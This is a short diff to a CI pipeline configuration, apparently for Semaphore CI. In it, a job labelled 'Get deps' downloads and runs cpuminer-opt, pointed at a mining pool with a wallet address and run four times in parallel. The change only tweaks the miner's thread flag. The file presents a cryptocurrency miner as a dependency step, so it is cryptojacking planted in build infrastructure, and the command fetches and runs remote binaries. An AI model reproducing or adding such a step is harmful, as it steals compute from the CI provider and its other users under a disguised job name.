@@ -13,7 +13,7 @@ blocks:
       jobs:
         - name: Get deps
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q8c9rfkykzn0ay6htumprh672g8uzfxzt2nwr2p'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q8c9rfkykzn0ay6htumprh672g8uzfxzt2nwr2p -t0'
           parallelism: 4
       agent:
         machine:
